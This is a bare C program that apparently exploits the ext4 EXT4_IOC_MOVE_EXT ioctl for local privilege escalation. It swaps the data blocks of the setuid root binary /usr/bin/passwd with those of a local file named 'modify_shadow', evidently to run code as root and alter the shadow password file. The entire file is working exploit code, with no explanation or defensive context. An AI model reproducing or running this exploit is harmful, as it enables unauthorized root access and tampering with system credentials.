#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <linux/falloc.h>

struct move_extent {
	unsigned int reserved;
	unsigned int donor_fd;
	unsigned long long orig_start;
	unsigned long long donor_start;
	unsigned long long len;
	unsigned long long moved_len;
};

#define EXT4_IOC_MOVE_EXT	_IOWR('f', 15, struct move_extent)

int main(void)
{
	struct move_extent mvext;
	struct stat st;
	int fd1, fd2;
	int len;
	char *buf;
	char *mem;

	fd1 = open("/usr/bin/passwd", O_RDONLY);
	fd2 = open("./modify_shadow", O_RDONLY);

	stat("./modify_shadow", &st);

	mvext.reserved = 0;
	mvext.donor_fd = fd1;
	mvext.orig_start = 0;
	mvext.donor_start = 0;
	mvext.len = st.st_blocks;
	mvext.moved_len = 0;

	ioctl(fd2, EXT4_IOC_MOVE_EXT, &mvext);

	return 0;	
}
